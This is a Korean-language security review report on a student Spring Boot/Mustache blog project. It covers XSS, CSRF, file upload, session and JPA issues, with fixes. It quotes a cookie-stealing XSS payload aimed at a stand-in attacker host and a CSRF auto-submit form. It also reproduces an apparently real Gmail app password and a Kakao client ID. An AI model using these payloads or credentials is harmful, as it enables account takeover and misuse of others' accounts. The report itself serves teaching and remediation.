# 보안 및 코드 품질 평가 보고서

> 대상: `demo_ssr_v1_1` (Spring Boot 3.4.12 + JPA + Mustache SSR)
> 목적: 학생용 학습 예제 코드의 보안 이슈, 아키텍처/JPA 사용, SSR 템플릿 품질 점검
> 작성일: 2026-04-10

심각도 표기 — 🔴 Critical / 🟠 High / 🟡 Medium / 🟢 Low / 💡 개선 제안

---

## 0. 종합 평가

| 항목 | 평가 | 코멘트 |
|---|---|---|
| 계층 구조 (Controller/Service/Repository) | ⭐⭐⭐⭐ | 분리가 깔끔하고 책임 분담이 학생 학습용으로 모범적 |
| DTO 분리 (Request/Response) | ⭐⭐⭐⭐ | 엔티티 누수 방지가 잘 되어 있음 |
| JPA 사용 (OSIV off, batch fetch, dirty checking 설명) | ⭐⭐⭐⭐ | 학습용 모범 답안 수준 |
| 주석 및 학습 가치 | ⭐⭐⭐⭐⭐ | 매우 친절. 단, 보안 관련 주의사항 추가 필요 |
| **보안** | ⭐⭐ | **즉시 수정 필요한 항목 다수 (자격증명 노출, XSS, CSRF 부재, h2-console 등)** |
| 운영 준비도 | ⭐⭐ | 개발/로컬용으로는 OK, 그러나 프로덕션 배포 전 강한 보강 필요 |

**핵심 우선 순위 (학생에게 먼저 가르쳐야 할 5가지)**
1. 🔴 비밀 값(메일 비밀번호, OAuth 키)을 소스 트리에서 즉시 제거
2. 🔴 게시글 본문 XSS — Summernote HTML 출력 살균(sanitize) 필요
3. 🟠 CSRF 보호 부재 — 상태 변경 요청 모두 무방비
4. 🟠 H2 콘솔 인증 없이 노출
5. 🟠 파일 업로드 검증(확장자/매직 넘버/경로 트래버설) 보강

---

## 1. 🔴 Critical 이슈

### 1-1. 메일 SMTP 자격증명이 소스에 평문 저장
**파일**: `src/main/resources/application-dev.yml:86-89`

```yaml
username: insertvalue2@gmail.com
password: kvjmvmnngslgmtpz   # ← Gmail 앱 비밀번호 그대로 노출
```

이 파일이 이미 Git 커밋에 들어가 있다면 **앱 비밀번호는 즉시 폐기(revoke)** 후 재발급해야 합니다. Git 히스토리에 한 번이라도 들어간 비밀은 "유출된 비밀"로 간주합니다.

**조치**
1. Google 계정 → 보안 → 앱 비밀번호에서 `kvjmvmnngslgmtpz` 폐기
2. 환경 변수로 변경:
   ```yaml
   spring:
     mail:
       username: ${MAIL_USERNAME}
       password: ${MAIL_PASSWORD}
   ```
3. `.gitignore`에 `application-dev.yml` 또는 `*-secret.yml` 패턴 추가
4. Git 히스토리에서 제거(`git filter-repo` 등)

---

### 1-2. 카카오 OAuth Client ID 기본값 하드코딩
**파일**: `src/main/resources/application-local.yml:84`

```yaml
client-id: ${KAKAO_CLIENT_ID:13a5d7c18fd6eaa38324e322a010c50e}
```

`${VAR:default}` 문법에서 default 값으로 실제 카카오 앱 키가 박혀 있습니다. `application-dev.yml`은 환경변수만 사용(L119-120)하도록 잘 되어 있는데, local 파일만 누락되어 있습니다.

**조치**: 기본값을 비우거나 가짜 값(`changeme`)으로 변경하고, `application-dev.yml`처럼 환경변수만 받도록 수정.

---

### 1-3. XSS — 게시글 본문 무이스케이프 출력
**파일**: `src/main/resources/templates/board/detail.mustache:59, 65, 70`

```mustache
{{{board.content}}}    {{! Mustache의 ‘세 중괄호’는 HTML 이스케이프를 안 함 }}
```

게시글은 Summernote 에디터로 작성되어 HTML이 그대로 DB에 저장됩니다. 사용자가 다음과 같은 페이로드를 게시글에 넣으면 다른 사용자 브라우저에서 임의 자바스크립트가 실행됩니다.

```html
<img src=x onerror="fetch('//attacker/'+document.cookie)">
```

세션 쿠키 탈취 → 계정 탈취까지 직결되는 **저장형 XSS(Stored XSS)** 입니다.

**조치 (택1 또는 병행)**
- (권장) 서버에서 HTML 살균: [OWASP Java HTML Sanitizer](https://github.com/OWASP/java-html-sanitizer) 또는 Jsoup `Safelist`로 허용 태그/속성만 통과
  ```java
  String safe = Jsoup.clean(rawHtml, Safelist.relaxed()
          .addAttributes("img", "src", "alt", "width", "height"));
  ```
- 세션 쿠키에 `HttpOnly`, `Secure`, `SameSite=Lax` 설정으로 피해 완화
- CSP 헤더 추가 (`Content-Security-Policy: default-src 'self'`)

---

### 1-4. H2 콘솔 인증 없이 노출 + 인터셉터로 화이트리스트
**파일**:
- `src/main/resources/application-dev.yml:31-33`, `application-local.yml:31-33`
- `src/main/java/.../_core/config/WebMvcConfig.java:39`

```yaml
h2:
  console:
    enabled: true
```
```java
.excludePathPatterns(..., "/h2-console/**")
```

`dev` 프로파일은 MySQL을 쓰므로 H2 콘솔이 동작하지는 않지만, **설정 자체가 켜져 있고 인터셉터에서 화이트리스트로 제외**되어 있습니다. 운영 환경에서 실수로 `local` 프로파일이 적용되거나 H2 의존성이 남아 있으면 누구나 DB에 접근 가능합니다.

**조치**
- 운영(`prod`) 프로파일에서는 `spring.h2.console.enabled: false` 명시
- 화이트리스트 제거 또는 IP 제한
- `runtimeOnly 'com.h2database:h2'` 의 운영 포함 여부 검토

---

### 1-5. `data.sql`의 평문 비밀번호
**파일**: `src/main/resources/db/data.sql:2-7`

```sql
INSERT INTO user_tb (username, password, ...) VALUES
  ('admin', '1234', ...), ...
```

학습용이라는 점은 이해되지만, **이 비밀번호는 BCrypt 해시가 아니므로 실제 로그인에 사용할 수 없습니다.** 파일 1행 주석(`기존 사용자는 로그인 불가 됨 !!!`)에 이미 명시되어 있는 것으로 보아 알고 계시지만, 학생들이 “seed 데이터로 admin/1234 로 로그인하면 되겠지” 라고 오해하기 쉽습니다.

**조치**
- BCrypt 해시값으로 교체. 예시 (`1234`의 BCrypt 해시):
  ```sql
  ('admin', '$2a$10$D8X8...실제해시...', 'admin@blog.com', NOW())
  ```
- 또는 `CommandLineRunner`에서 `passwordEncoder.encode("1234")`로 한 번에 시드 (이미 `application-local.yml`에 그렇게 한다는 주석이 있음 — 이쪽으로 통일 권장)

---

## 2. 🟠 High 이슈

### 2-1. CSRF 보호가 전혀 없음
**근거**: `build.gradle:35-50`

```gradle
implementation 'org.springframework.security:spring-security-crypto'  // 암호화 모듈만
```

Spring Security의 `web` 모듈을 의존하지 않고 `crypto` 모듈(BCrypt만)을 가져다 쓰고 있어 **CSRF 토큰 생성/검증 메커니즘이 존재하지 않습니다**. 모든 상태 변경 엔드포인트(`/board/{id}/delete`, `/board/{id}/purchase`, `/reply/save`, `/user/update`, `/refund/...` 등)가 위변조에 무방비 상태입니다.

공격 시나리오:
```html
<!-- 공격자 사이트 -->
<form action="https://피해사이트/board/5/delete" method="post" id="f">
</form>
<script>document.getElementById('f').submit();</script>
```
피해자가 로그인된 상태로 공격자 페이지를 방문하면 5번 게시글이 그대로 삭제됩니다.

**조치 (학습 단계별)**
- (정공법) `spring-boot-starter-security` 추가 후 CSRF 활성화 — 학생들에게 Spring Security 입문 단원으로 자연스럽게 연결
- (간이) 세션 단위 토큰을 직접 발급해 hidden input으로 검증 (학습용 보조 예제)
- 쿠키에 `SameSite=Lax`(또는 `Strict`) 적용은 최소한의 즉시 조치

---

### 2-2. 파일 업로드 검증 미흡
**파일**: `src/main/java/.../_core/utils/FileUtil.java:181-195`, `61-112`

```java
public static boolean isImageFile(MultipartFile file) {
    String contentType = file.getContentType();
    return contentType != null && contentType.startsWith("image/");
}
```

문제점:
1. **MIME 타입은 클라이언트가 보낸 값** — `curl` 또는 인터셉터로 손쉽게 위조 가능. `.jsp`, `.html`, `.svg`에 `Content-Type: image/png`만 붙여 업로드 가능.
2. **확장자 검증 없음** — `originalFilename`을 그대로 쓰므로 `evil.html`도 통과.
3. **경로 트래버설 부분 위험** — `uuid + "_" + originalFilename` 구조라 UUID가 앞에 붙어 일부 완화되긴 하지만, `originalFilename`에 `..\evil.exe` 같은 문자가 포함되면 OS에 따라 문제가 될 수 있음. `Paths.get(uploadDir, savedFilename)` 후 정규화/검증 미수행.
4. **파일 크기 50MB**(application-dev.yml:74-75) — 학습용으론 크지만 DoS 가능성 있음.
5. **SVG 업로드 시 XSS** — `<svg>`에 `<script>` 태그 삽입 가능. `image/svg+xml` 도 차단해야 함.
6. `images/` 디렉토리가 정적 리소스로 그대로 매핑(`WebMvcConfig:49-50`)되므로 업로드된 파일이 즉시 웹에서 접근 가능.

**개선 예시**
```java
private static final Set<String> ALLOWED_EXT = Set.of("jpg","jpeg","png","gif","webp");

public static String saveImage(MultipartFile file, String dir) throws IOException {
    if (file == null || file.isEmpty()) return null;

    // 1) 확장자 화이트리스트
    String original = StringUtils.cleanPath(file.getOriginalFilename());
    String ext = StringUtils.getFilenameExtension(original);
    if (ext == null || !ALLOWED_EXT.contains(ext.toLowerCase())) {
        throw new Exception400("허용되지 않는 확장자입니다");
    }

    // 2) 매직 넘버(시그니처) 검증
    try (InputStream in = file.getInputStream()) {
        if (!isRealImage(in)) throw new Exception400("이미지가 아닙니다");
    }

    // 3) 안전한 파일명 (원본 이름 사용 안 함)
    String safeName = UUID.randomUUID() + "." + ext.toLowerCase();
    Path target = Paths.get(dir).toAbsolutePath().normalize().resolve(safeName);

    // 4) 경로 탈출 방지
    if (!target.startsWith(Paths.get(dir).toAbsolutePath().normalize())) {
        throw new Exception400("잘못된 경로");
    }

    Files.copy(file.getInputStream(), target);
    return safeName;
}
```

---

### 2-3. Summernote가 이미지를 Base64로 인라인 저장
**파일**: `src/main/resources/templates/board/save-form.mustache` (insertImageAsBase64 함수)

이미지를 `data:image/...;base64,...` 형태로 본문 HTML에 박아 DB에 저장합니다.

문제점:
- 이미지 1MB → 본문 1.33MB로 폭증, `board.content`가 LOB 컬럼이라도 DB I/O 부담 큼
- 게시글 목록 SELECT 시 본문 컬럼이 함께 로딩되면 N+1보다 더 큰 성능 이슈
- XSS 살균 시 base64 데이터를 어떻게 다룰지 결정해야 함

**조치**: `/board/upload-image` 엔드포인트를 만들고 서버에 저장한 뒤 URL만 본문에 삽입(Summernote `callbacks.onImageUpload`).

---

### 2-4. 결제·환불 페이지 정보 노출 (정보 누출형 IDOR)
**파일**: `src/main/java/.../refund/RefundService.java` (환불요청화면검증)

소유자가 아니면 `Exception403`을 던지므로 **직접 변조는 막혀 있습니다(✓ 잘 됨)**. 다만 학생들에게 가르칠 포인트:

- URL의 `{paymentId}` 같은 PK 노출은 `enumeration attack`(1, 2, 3 …) 의 공격 표면이 됨
- 가능하면 PK 대신 UUID 또는 사용자별 시퀀스 사용
- 403 응답 자체가 “해당 ID는 존재한다”는 정보 누설 — `404`로 통일하는 패턴도 학습 가치 있음

권장 학습 코드 패턴 추가:
```java
Payment p = paymentRepository.findByIdAndUserId(paymentId, userId)
        .orElseThrow(() -> new Exception404("결제 내역을 찾을 수 없습니다"));
// 처음부터 본인 것만 조회 → 굳이 isOwner 분기 불필요
```

---

### 2-5. 로그인 후 세션 ID 재발급 부재 (Session Fixation)
**파일**: `src/main/java/.../user/UserController.java` 로그인 처리부

로그인 성공 시 기존 세션에 그대로 `setAttribute("sessionUser", user)`를 하면, 공격자가 미리 알고 있던 세션 ID로 피해자를 로그인시켜 그 세션을 가로채는 **세션 픽세이션** 공격에 노출됩니다.

**조치**
```java
// 로그인 성공 직후
HttpSession oldSession = request.getSession(false);
if (oldSession != null) oldSession.invalidate();
HttpSession newSession = request.getSession(true);
newSession.setAttribute("sessionUser", user);
```

또한 `LoginInterceptor.java:43`의 `request.getSession()` (인자 없음)은 세션을 자동 생성합니다. 이 부분은 큰 문제는 아니지만, `request.getSession(false)` 사용을 권장.

---

### 2-6. 쿠키 보안 속성 설정 부재
**파일**: `application-dev.yml:1-9`

```yaml
server:
  servlet:
    encoding: ...
  session:
    tracking-modes: cookie
```

`tracking-modes: cookie`는 잘 설정되어 있으나 다음이 빠져 있습니다:
```yaml
server:
  servlet:
    session:
      cookie:
        http-only: true
        secure: true        # HTTPS 환경에서
        same-site: lax
```

XSS 발생 시 `HttpOnly`만 있어도 `document.cookie` 탈취가 막힙니다(이번 1-3 XSS와 함께 보강 필수).

---

### 2-7. `System.out.println` 사용
**파일**: `UserService.java:369, 375, 395, 408, 438, 469`, `Reply.java:67-78`, 등 다수

```java
System.out.println("4. 고유한 username : " + username);
System.err.println("프로필 이미지 파일 삭제 실패: " + e.getMessage());
```

문제점
- 운영 환경에서 표준 출력은 로깅 레벨 제어 불가, 비동기 버퍼 미적용
- 카카오 액세스 토큰 같은 **민감 정보가 로그로 노출** (`UserService.java:438`)

**조치**: SLF4J `@Slf4j`로 통일하고, 토큰류는 절대 로깅하지 말 것.
```java
log.debug("kakao username = {}", username);   // 토큰은 찍지 않음
```

---

## 3. 🟡 Medium 이슈

### 3-1. JPA — `User.roles`가 EAGER + 항상 로딩
**파일**: `src/main/java/.../user/User.java`

```java
@OneToMany(cascade = CascadeType.ALL, orphanRemoval = true, fetch = FetchType.EAGER)
private List<UserRole> roles = new ArrayList<>();
```

- `EAGER` 컬렉션은 N+1 지뢰. 사용자 목록 조회 시 매번 roles까지 끌고 옴
- `default_batch_fetch_size: 100`이 있어 일부 완화되긴 하지만 모범 사례는 아님

**조치**: `LAZY`로 변경하고, 로그인 시점에만 `findByUsernameWithRoles()`처럼 `JOIN FETCH`로 가져오기 (이미 그 메서드가 존재하므로 일관성만 정리).

### 3-2. 검색 쿼리 — 학습용 코멘트 강화 권장
**파일**: `BoardRepository.java:149-153`

```java
@Query("SELECT b FROM Board b JOIN b.user " +
       "WHERE b.title LIKE CONCAT('%', :keyword, '%') " +
       "   OR b.content LIKE CONCAT('%', :keyword, '%') ...")
```

`@Param` 바인딩을 사용하므로 SQL Injection 안전(✓). 다만 학습용이라면 **“왜 안전한지”**, **“왜 `'%' + keyword + '%'` 문자열 결합으로 만들면 안 되는지”** 를 주석으로 명시해주면 더 좋습니다.

또한 `LIKE '%keyword%'`는 인덱스를 못 타서 데이터가 늘면 느려짐 → "성능 최적화 단원"으로 자연스러운 후속 학습거리.

### 3-3. N+1 가능성 — 결제 목록에서 환불 조회
**파일**: `payment/PaymentService.java` (결제 목록 → 환불 여부 매핑)

`paymentList.stream().map(p -> refundRequestRepository.findByPaymentId(p.getId()))` 패턴이 있다면 결제 N건당 환불 조회 N건이 추가로 나갑니다.

**조치**: `findByPaymentIdIn(List<Long>)`로 한 번에 조회 후 Map 변환.

### 3-4. 트랜잭션 경계 — `포인트충전`
**파일**: `UserService.java:524-534`

```java
@Transactional
public User 포인트충전(Long userId, Integer amount) { ... }
```

- 동시 요청 시 두 트랜잭션이 같은 row의 `point` 값을 읽고 각자 더한 뒤 저장하면 **lost update**가 발생합니다.
- 학생 수준에서는 `@Lock(LockModeType.PESSIMISTIC_WRITE)` 또는 JPQL `update user set point = point + :amount where id = :id` 형태로 “원자적 갱신”을 가르치는 좋은 사례가 됩니다.

### 3-5. 이중 환불 검증 보강
**파일**: `RefundService.java:71-73`

진행 중인 환불은 막지만, **이미 환불 완료된 결제**에 대한 재요청은 막지 않고 있습니다. `Payment` 또는 `RefundRequest`의 상태 enum까지 검사하도록 수정 필요.

### 3-6. 포인트 충전 상한 미설정
임의 금액을 넣을 수 있으면 학생이 실수로 `Integer.MAX_VALUE`를 넣어 디버깅 어려운 상태가 될 수 있음. 입력 검증(`@Min`/`@Max`) 추가 권장.

### 3-7. 예외 응답이 inline `<script>`로 alert
**파일**: `MyExceptionHandler.java:35-37`

```java
String script = "<script>alert('" + escapedMessage + "');history.back();</script>";
```

작은따옴표만 이스케이프하면 안전하지 않습니다. `</script>`, 줄바꿈, 백슬래시, 유니코드 이스케이프 등을 통과시키면 또 다른 XSS가 됩니다. 학습용으로는 의도가 명확하지만, **모범 답안은 표준 에러 페이지(`err/400.mustache`)로 forward**하는 것입니다.

### 3-8. 로그인 인터셉터 화이트리스트 설계
**파일**: `WebMvcConfig.java:35-40`

```java
.addPathPatterns("/board/**", "/user/**", "/reply/**", "/admin/**")
.excludePathPatterns("/login", "/join", "/logout", "/user/kakao", ...)
```

- `/admin/**`는 인터셉터에서 `LoginInterceptor` + `AdminInterceptor` 를 모두 통과해야 함 — 잘 등록되어 있음(✓)
- `/board/{id:\\d+}`는 비로그인 허용. 다만 유료 게시글 본문도 이 한 엔드포인트에서 처리되므로 “미로그인이면 본문이 막힌다”를 서비스단에서 다시 한 번 검증해야 함 (현재 잘 처리되는 것으로 보이나 학생에게 주의 환기 필요)

---

## 4. 🟢 Low / 💡 개선 제안

### 4-1. `OAuth Redirect URI` 하드코딩
**파일**: `UserService.java:422`
```java
params.add("redirect_uri", "http://localhost:8080/user/kakao");
```
환경별로 달라져야 하므로 `application-*.yml`로 빼고 `@Value` 주입.

### 4-2. `RestTemplate` 매번 `new`
같은 파일 410, 450행에서 `new RestTemplate()`을 매 호출마다 생성. 빈으로 등록해 재사용하면 커넥션 풀 활용 및 학습용으로도 더 좋음.

### 4-3. 엔티티 직접 세션 저장
`session.setAttribute("sessionUser", user)`에 JPA 엔티티 그대로 저장 중. 세션 직렬화 이슈, 영속성 컨텍스트 분리 이후 `LazyInitializationException` 잠재 위험. **세션 전용 DTO**(SessionUser)로 분리 권장 — 학습 가치 큼.

### 4-4. `Lombok @Data` 남용 주의
`User.java`가 `@Data` (또는 setter 다수)를 쓰면 외부에서 임의 필드 변경이 가능. 학생에게 “엔티티는 setter를 함부로 열지 말고 의미 있는 메서드(`update()`, `chargePoint()`)로만 변경한다”는 원칙을 반복 강조해야 함. 코드에 `user.update(updateDTO)` 같은 좋은 패턴이 이미 있으므로 그쪽으로 통일.

### 4-5. CDN 외부 자원 — SRI 미적용
`board/save-form.mustache`에서 Summernote/Bootstrap을 jsdelivr CDN으로 로드. 학습용에는 무방하나 “SRI(Subresource Integrity)” 개념 한 줄 코멘트로 소개해주면 보안 학습 깊이가 올라감.
```html
<link href="https://cdn.jsdelivr.net/.../summernote-bs5.min.css"
      integrity="sha384-..." crossorigin="anonymous">
```

### 4-6. `application-prod.yml` 부재 가능성
실제 프로파일 파일 목록에 `prod`가 있다면 그 안에도 H2 콘솔 비활성, `ddl-auto: validate`, `show-sql: false` 가 들어있는지 확인 필요.

### 4-7. `ddl-auto: update` (dev)
운영 DDL 자동 변경은 위험. 학생용으로는 OK지만 “운영에서는 `validate` 또는 마이그레이션 도구(Flyway/Liquibase)” 라는 주석을 달아주는 것이 좋음.

### 4-8. 로그인 폼 `autocomplete`
**파일**: `templates/user/login-form.mustache:13-16`
공용 PC 학습 환경을 고려하면 `autocomplete="off"` 또는 `autocomplete="current-password"` 명시 권장.

### 4-9. `1-비밀번호 정책` 부재
`UserRequest.JoinDTO.validate()`에서 비밀번호 길이/복잡도 검증을 추가하면 좋음. (학생용 실습 과제로도 적합)

---

## 5. 학습용으로 잘 되어 있는 점 (칭찬)

학생들이 **그대로 따라 해도 좋은 모범 사례**들입니다.

- ✅ `BCryptPasswordEncoder` 도입과 매우 친절한 주석 (`WebMvcConfig.java:53-76`) — 단방향/Salt 설명이 비유까지 포함
- ✅ `OSIV: false` 명시 + “Service에서 DTO 변환 후 반환” 패턴 일관 적용 (`application-dev.yml:48-52`)
- ✅ `default_batch_fetch_size: 100` 으로 N+1 자동 완화 (`application-dev.yml:66`)
- ✅ Custom Exception 4xx/5xx 와 `@ControllerAdvice` 분리 (`_core/errors/...`)
- ✅ 인증(Login)·인가(Admin)·세션(Session) 인터셉터 분리 — SoC 잘 지킴
- ✅ Service 메서드명을 한글로 적어 비즈니스 로직 가독성 ↑ (학습용 컨텍스트에 적합)
- ✅ 더티 체킹과 명시적 `save()`의 차이를 주석으로 설명 (`UserService.java:286-289`)
- ✅ Repository에 `findByUsernameWithRoles` 같은 `JOIN FETCH` 메서드 학습 예제 포함

---

## 6. 권장 수정 우선순위 체크리스트

학생 실습/리뷰용으로 단계별 진행을 권장합니다.

### Step 1 — 즉시 (Critical)
- [ ] `application-dev.yml`의 메일 비밀번호 환경변수화 + Gmail 앱 비밀번호 폐기
- [ ] `application-local.yml`의 `KAKAO_CLIENT_ID` 기본값 제거
- [ ] `data.sql`의 평문 비밀번호 BCrypt 해시로 교체 (또는 시드 삭제, CommandLineRunner 통일)
- [ ] H2 콘솔 운영 비활성 + 인터셉터 화이트리스트 재검토

### Step 2 — 학습 단원 한 챕터 분량 (High)
- [ ] Summernote 본문 살균 (Jsoup `Safelist`) → 저장형 XSS 방지
- [ ] CSRF 토큰 도입 (Spring Security 또는 수동 토큰)
- [ ] 파일 업로드: 확장자 화이트리스트 + 매직 넘버 + 안전한 파일명
- [ ] 세션 쿠키 `HttpOnly` / `SameSite=Lax`
- [ ] 로그인 후 세션 ID 재발급
- [ ] `System.out.println` → SLF4J 일괄 변환, 토큰류 로깅 금지

### Step 3 — 코드 품질 (Medium)
- [ ] `User.roles` LAZY 변경 + JOIN FETCH 일관화
- [ ] 결제-환불 N+1 제거 (`findByPaymentIdIn`)
- [ ] 포인트 충전 동시성 처리 (`@Lock` 또는 원자적 UPDATE)
- [ ] 환불 상태 enum 검증 강화
- [ ] 세션 전용 `SessionUser` DTO 분리

### Step 4 — 다음 학습 단원으로 연결 (Low)
- [ ] OAuth redirect URI 환경변수화
- [ ] `RestTemplate` 빈 등록
- [ ] CDN SRI, 비밀번호 정책, `ddl-auto: validate` 등 운영 모범 사례

---

## 7. 학생들에게 가르치면 좋은 “1줄 보안 격언”

학습 자료에 박스로 강조해 넣어주세요.

1. **“브라우저가 보낸 모든 값은 거짓말일 수 있다.”** — Content-Type, Origin, hidden 필드 모두.
2. **“출력 시점에 이스케이프하라.”** — 입력 필터링은 보조 수단, 출력 컨텍스트별 이스케이프가 본질.
3. **“PK 노출 = 공격 표면.”** — 가능한 곳은 본인 조건과 함께 조회.
4. **“비밀은 코드와 같이 살지 않는다.”** — 환경변수, 시크릿 매니저로 분리.
5. **“리다이렉트 후에 권한을 보지 말고, 동작 직전에 보아라.”** — 인터셉터를 믿더라도 서비스에서 한 번 더.

---

> 본 문서는 학습용 평가 보고서입니다. 실제 운영 시에는 추가적인 보안 점검(취약점 스캐너, 의존성 CVE 점검, 부하/침투 테스트)이 필요합니다.
